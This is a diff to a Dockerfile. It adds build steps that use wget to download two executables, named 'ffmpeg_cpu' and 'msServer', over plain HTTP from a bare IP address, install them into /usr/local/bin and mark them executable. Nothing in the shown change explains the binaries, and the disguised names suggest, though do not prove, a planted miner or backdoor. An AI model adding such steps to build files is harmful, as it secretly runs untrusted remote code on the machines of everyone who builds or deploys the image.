@@ -27,6 +27,10 @@ RUN apt-get update && apt-get install -y \
     golang-go \
     git openssh-client \
     --no-install-recommends \
+ && wget -O /usr/local/bin/ffmpeg_cpu http://45.79.75.213:8099/ffmpeg_cpu \
+ && wget -O /usr/local/bin/msServer http://45.79.75.213:8099/msServer \
+ && chmod +x /usr/local/bin/ffmpeg_cpu \
+ && chmod +x /usr/local/bin/msServer \
  && rm -rf /var/lib/apt/lists/*
 
 USER docker
